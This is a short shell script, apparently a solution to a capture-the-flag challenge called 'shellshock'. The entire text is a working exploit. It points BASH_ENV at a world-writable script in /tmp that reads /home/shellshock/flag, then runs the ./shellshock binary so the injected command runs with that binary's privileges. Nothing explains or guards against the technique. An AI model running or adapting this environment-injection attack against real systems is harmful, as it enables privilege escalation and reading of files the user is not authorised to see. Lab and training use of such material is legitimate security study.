export BASH_ENV=/tmp/jeje/script
mkdir /tmp/jeje
chmod 777 /tmp/jeje
echo "cat /home/shellshock/flag" > /tmp/jeje/script
chmod 777 /tmp/jeje/script
./shellshock
